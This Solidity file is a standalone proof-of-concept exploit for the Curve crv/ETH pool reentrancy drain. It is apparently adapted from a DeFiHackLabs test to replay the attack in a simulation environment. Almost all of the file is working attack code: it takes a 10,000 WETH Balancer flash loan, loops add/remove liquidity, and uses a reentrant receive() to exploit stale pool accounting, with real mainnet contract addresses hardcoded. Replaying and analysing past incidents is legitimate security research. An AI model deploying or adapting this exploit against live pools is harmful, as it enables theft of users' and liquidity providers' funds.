// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Curve_exp02).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest IS the flash-loan receiver AND the reentrant attacker via its
// own receive()), so there is no standalone contract to deploy. This contract
// is a faithful, self-contained copy of that inline attack (testExploit's
// body -> run(), receiveFlashLoan, receive()) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/Curve_exp02.sol in the registry.
//
// Root cause: Curve's crv/ETH crypto-pool (Vyper 0.3.0) requests a
// `@nonreentrant('lock')` guard on remove_liquidity/remove_liquidity_one_coin/
// exchange/add_liquidity, but Vyper 0.2.15-0.3.0 mis-compiled that decorator
// so the lock never actually held. remove_liquidity() pays out ETH via a raw
// low-level call BEFORE it finishes writing back self.balances/self.D, so the
// attacker's receive() re-enters add_liquidity()+exchange() while the pool's
// internal accounting is stale relative to its real balances. Looped 20 times
// inside a 10,000 WETH Balancer flash loan (0 fee), this drains ~7,929 WETH
// from the pool in one transaction.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH9 {
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256 wad) external;
    function deposit() external payable;
    function transfer(address, uint256) external returns (bool);
}

interface ICurve {
    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth
    ) external payable returns (uint256);

    function add_liquidity(
        uint256[2] memory amounts,
        uint256 min_mint_amount,
        bool use_eth
    ) external payable returns (uint256);

    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts, bool use_eth) external;

    function remove_liquidity_one_coin(uint256 token_amount, uint256 i, uint256 min_amount, bool use_eth) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract CurveCrvEthDrain {
    IWETH9 constant WETH = IWETH9(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 constant CRV = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
    IERC20 constant LP = IERC20(0xEd4064f376cB8d68F770FB1Ff088a3d0F3FF5c4d);
    ICurve constant CURVE_POOL = ICurve(0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511);
    IBalancerVault constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint256 public nonce;

    // Entrypoint recorded by the playground (mirrors testExploit()).
    function run() external {
        CRV.approve(address(CURVE_POOL), type(uint256).max);

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000 ether;
        bytes memory userData = "";
        BALANCER.flashLoan(address(this), tokens, amounts, userData);
    }

    // Balancer flash-loan callback (mirrors ContractTest.receiveFlashLoan).
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.withdraw(WETH.balanceOf(address(this)));

        for (uint256 i; i < 20; ++i) {
            uint256[2] memory amount;
            amount[0] = 400 ether;
            amount[1] = 0;
            CURVE_POOL.add_liquidity{value: 400 ether}(amount, 0, true); // add liquidity

            amount[0] = 0;
            CURVE_POOL.remove_liquidity(LP.balanceOf(address(this)), amount, true); // reentrancy enter point
            nonce++;

            CURVE_POOL.remove_liquidity_one_coin(LP.balanceOf(address(this)), 0, 0, true); // remove liquidity to get eth
            nonce++;

            CURVE_POOL.exchange(1, 0, CRV.balanceOf(address(this)), 0, true); // swap crv to eth
            nonce++;
        }

        WETH.deposit{value: address(this).balance}();

        WETH.transfer(address(BALANCER), amounts[0] + feeAmounts[0]);
    }

    // Reentrant window (mirrors ContractTest.receive()): fires on every 3rd
    // nonce increment, i.e. once per loop iteration, right after
    // remove_liquidity() pays out ETH but before the pool finishes writing
    // back its accounting.
    receive() external payable {
        if (msg.sender == address(CURVE_POOL) && nonce % 3 == 0) {
            uint256[2] memory amount;
            amount[0] = 400 ether;
            amount[1] = 0;
            CURVE_POOL.add_liquidity{value: 400 ether}(amount, 0, true);
            CURVE_POOL.exchange{value: 500 ether}(0, 1, 500 ether, 0, true);
        }
    }
}
